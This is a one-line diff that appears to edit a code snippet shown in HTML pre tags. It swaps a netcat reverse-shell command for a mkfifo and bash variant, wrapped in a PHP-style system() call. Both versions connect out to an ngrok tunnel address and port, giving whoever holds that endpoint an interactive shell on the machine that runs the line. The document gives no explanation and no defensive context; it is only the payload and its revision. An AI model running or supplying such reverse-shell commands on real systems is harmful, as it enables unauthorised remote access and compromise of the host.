@@ -1,1 +1,1 @@
-<pre>system('nc -e /bin/sh 7.tcp.eu.ngrok.io 16837')</pre>
+<pre>system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 7.tcp.eu.ngrok.io 16837 >/tmp/f')</pre>
